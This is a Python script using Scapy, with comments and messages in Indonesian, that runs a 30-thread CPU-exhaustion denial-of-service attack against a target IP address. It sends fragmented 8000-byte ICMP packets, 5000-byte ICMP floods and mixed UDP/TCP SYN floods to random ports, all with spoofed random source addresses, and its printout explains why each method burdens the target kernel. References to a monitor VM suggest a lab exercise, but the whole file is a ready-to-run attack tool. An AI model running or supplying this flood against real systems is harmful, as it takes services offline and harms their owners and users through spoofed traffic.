from scapy.all import IP, ICMP, UDP, TCP, Raw, send, fragment, RandIP, RandShort
import threading
import time

# --- KONFIGURASI ---
target_ip = "192.168.0.118"  # GANTI DENGAN IP TARGET ANDA
# -------------------

# Konfigurasi multi-threading untuk CPU exhaustion
# Menggunakan 30 threads untuk memaksimalkan penggunaan CPU target
NUM_FRAGMENTATION_THREADS = 10  # Thread untuk serangan fragmentasi
NUM_LARGE_ICMP_THREADS = 10     # Thread untuk ICMP besar
NUM_MIXED_FLOOD_THREADS = 10    # Thread untuk mixed UDP/TCP flood

PACKETS_PER_BATCH = 30  # Batch lebih kecil karena paket lebih kompleks
FRAGMENTATION_PAYLOAD_SIZE = 8000  # Bytes - memaksa fragmentasi dan reassembly
LARGE_ICMP_PAYLOAD_SIZE = 5000     # Bytes - payload besar untuk ICMP
MIXED_PAYLOAD_SIZE = 1400          # Bytes - untuk UDP/TCP

print("=" * 70)
print("--- SERANGAN CPU EXHAUSTION ---")
print("=" * 70)
print(f"Target: {target_ip}")
print(f"\nKonfigurasi Thread:")
print(f"  - Thread Fragmentasi: {NUM_FRAGMENTATION_THREADS} (paket 8000-byte)")
print(f"  - Thread ICMP Besar: {NUM_LARGE_ICMP_THREADS} (paket 5000-byte)")
print(f"  - Thread Mixed UDP/TCP: {NUM_MIXED_FLOOD_THREADS} (port random)")
print(f"  - TOTAL THREAD: {NUM_FRAGMENTATION_THREADS + NUM_LARGE_ICMP_THREADS + NUM_MIXED_FLOOD_THREADS}")
print(f"\nBatch Size: {PACKETS_PER_BATCH} paket per thread")
print("\nMENGAPA LEBIH EFEKTIF:")
print("  1. Fragmentasi IP memaksa operasi reassembly kernel yang mahal")
print("  2. Payload besar meningkatkan overhead pemrosesan per paket")
print("  3. Port random memaksa lookup tabel koneksi dan failure")
print("  4. Protokol campuran mencegah optimasi fast-path kernel")
print("  5. 30 thread membanjiri core CPU dengan pemrosesan konkuren")
print("\nDampak yang Diharapkan:")
print("  - Penggunaan CPU target: 30-70% (naik dari 0.6%)")
print("  - Latency ping dari MonitorVM: 100-500ms")
print("  - Packet loss akibat CPU exhaustion")
print("=" * 70)
print("\nTekan Ctrl+C untuk berhenti.\n")

stop_attack = False

def fragmentation_attack_thread(thread_id):
    """
    Thread untuk serangan fragmentasi IP.
    Mengirim paket 8000-byte yang difragmentasi, memaksa kernel target
    untuk melakukan reassembly yang CPU-intensive.
    """
    global stop_attack
    
    # Pre-build packet batch untuk efisiensi
    packets = []
    for _ in range(PACKETS_PER_BATCH):
        # Buat paket besar yang akan difragmentasi
        large_packet = IP(src=RandIP(), dst=target_ip) / \
                      ICMP() / \
                      Raw(load="X" * FRAGMENTATION_PAYLOAD_SIZE)
        
        # Fragment paket dengan ukuran fragment 800 bytes
        # Ini memaksa kernel untuk reassemble banyak fragment
        fragments = fragment(large_packet, fragsize=800)
        packets.extend(fragments)
    
    print(f"[FRAG Thread {thread_id}] Dimulai - Mengirim paket terfragmentasi")
    
    while not stop_attack:
        try:
            # Kirim semua fragment dengan kecepatan maksimal
            send(packets, verbose=0, inter=0)
        except Exception as e:
            if not stop_attack:
                print(f"[FRAG Thread {thread_id}] Error: {e}")
            break

def large_icmp_attack_thread(thread_id):
    """
    Thread untuk ICMP flood dengan payload besar.
    Payload 5000-byte memaksa kernel memproses paket besar,
    meningkatkan CPU overhead per paket.
    """
    global stop_attack
    
    # Pre-build packet batch
    payload = Raw(load="Y" * LARGE_ICMP_PAYLOAD_SIZE)
    packets = []
    for _ in range(PACKETS_PER_BATCH):
        # Gunakan random source IP untuk memaksa kernel memeriksa routing table
        packet = IP(src=RandIP(), dst=target_ip) / ICMP() / payload
        packets.append(packet)
    
    print(f"[LARGE-ICMP Thread {thread_id}] Dimulai - Mengirim paket ICMP 5000-byte")
    
    while not stop_attack:
        try:
            send(packets, verbose=0, inter=0)
        except Exception as e:
            if not stop_attack:
                print(f"[LARGE-ICMP Thread {thread_id}] Error: {e}")
            break

def mixed_flood_attack_thread(thread_id):
    """
    Thread untuk mixed UDP/TCP flood dengan random ports.
    Alternatif UDP dan TCP SYN memaksa kernel melakukan:
    - Port lookup failures (UDP ke port random)
    - Connection table operations (TCP SYN ke port random)
    Ini mencegah kernel menggunakan fast-path processing.
    """
    global stop_attack
    
    # Pre-build packet batch dengan mix UDP dan TCP
    payload = Raw(load="Z" * MIXED_PAYLOAD_SIZE)
    packets = []
    for i in range(PACKETS_PER_BATCH):
        if i % 2 == 0:
            # UDP packet dengan random source/dest ports
            packet = IP(src=RandIP(), dst=target_ip) / \
                    UDP(sport=RandShort(), dport=RandShort()) / \
                    payload
        else:
            # TCP SYN packet dengan random source/dest ports
            packet = IP(src=RandIP(), dst=target_ip) / \
                    TCP(sport=RandShort(), dport=RandShort(), flags="S")
        packets.append(packet)
    
    print(f"[MIXED Thread {thread_id}] Dimulai - Mengirim UDP/TCP ke port random")
    
    while not stop_attack:
        try:
            send(packets, verbose=0, inter=0)
        except Exception as e:
            if not stop_attack:
                print(f"[MIXED Thread {thread_id}] Error: {e}")
            break

try:
    threads = []
    
    print("\nMemulai thread serangan...\n")
    
    # Start Fragmentation threads
    for i in range(NUM_FRAGMENTATION_THREADS):
        thread = threading.Thread(target=fragmentation_attack_thread, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
        time.sleep(0.1)  # Small delay between thread starts
    
    # Start Large ICMP threads
    for i in range(NUM_LARGE_ICMP_THREADS):
        thread = threading.Thread(target=large_icmp_attack_thread, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
        time.sleep(0.1)
    
    # Start Mixed Flood threads
    for i in range(NUM_MIXED_FLOOD_THREADS):
        thread = threading.Thread(target=mixed_flood_attack_thread, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
        time.sleep(0.1)
    
    print("\n" + "=" * 70)
    print(f"SEMUA {len(threads)} THREAD AKTIF - SERANGAN CPU EXHAUSTION BERJALAN")
    print("=" * 70)
    print("\nMonitor penggunaan CPU target VM dengan: top atau htop")
    print("Monitor latency ping dari MonitorVM untuk melihat dampak\n")
    
    # Keep main thread alive
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print("\n\n" + "=" * 70)
    print("--- MENGHENTIKAN SERANGAN ---")
    print("=" * 70)
    stop_attack = True
    time.sleep(2)  # Beri waktu thread untuk berhenti
    print("\n--- Serangan dihentikan dengan sukses ---")
    print("=" * 70)
